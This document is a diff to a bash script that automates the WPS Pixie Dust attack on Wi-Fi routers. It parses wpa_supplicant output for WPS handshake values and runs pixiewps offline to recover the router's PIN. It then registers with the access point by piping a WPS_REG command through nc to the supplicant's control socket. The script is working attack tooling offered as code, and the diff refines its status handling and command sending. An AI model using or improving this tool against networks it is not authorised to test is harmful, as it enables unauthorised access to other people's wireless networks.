@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 
 TEMPDIR=$(mktemp -d)
 TEMPFILE=$(mktemp --suffix=.conf)
@@ -35,9 +35,10 @@ function pixie()
 		PIN=$(pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force |\
 			grep 'WPS pin' |\
 			cut -d : -f 2)
-		PIN=$(echo $PIN)
+		PIXIE_STATUS=SUCCESS
+	else
+		PIXIE_STATUS=FAIL
 	fi
-	
 	resetPixie
 }
 
@@ -52,14 +53,6 @@ function attack()
 	#Launch wpa_supplicant & parse output
 	while IFS= read -r LINE
 	do
-#		echo "$LINE"
-		if [[ $LINE =~ "nl80211:" ]]\
-		|| [[ $LINE =~ "P2P:" ]]\
-		|| [[ $LINE =~ "*" ]]\
-		|| [[ $LINE =~ "EAP:" ]]
-		then
-			continue
-		fi
 		#Parsing WPS messages
 		if [[ $LINE =~ "WPS:" ]]
 		then
@@ -107,7 +100,7 @@ function attack()
 			fi
 
 		#Status messages
-		elif [[ $LINE =~ ":\ State: " ]]
+		elif [[ $LINE =~ "State:" ]]
 		then
 			if [[ $LINE =~ "-> SCANNING" ]]
 			then
@@ -146,8 +139,9 @@ function attack()
 
 function sendCMD()
 {
-	echo "WPS_REG $BSSID $PIN" | nc -u -U $TEMPDIR/$IFACE &
-	printI "Using PIN: $PIN"
+	CMD="WPS_REG "${BSSID}\ ${PIN}
+	echo "$CMD" | tee >(nc -u -U $TEMPDIR/$IFACE) &
+	printI "$PIN"
 }
 function gethex()
 {
@@ -176,9 +170,11 @@ attack
 if [ "$PKE" ] && [ "$PKR" ] && [ "$EHASH1" ] && [ "$EHASH2" ] && [ "$ENONCE" ] && [ "$PIXIE" -eq 1 ]
 then
 	pixie
-	printG "WPS pin: $(echo $PIN)"
-	killall wpa_supplicant
-	attack
+	if [ "$PIXIE_STATUS" = "SUCCESS" ]
+	then
+		printG "WPS pin: $(echo $PIN)"
+		attack
+	fi
 else
 	printE "Not enough data to run PixieDust"
 fi
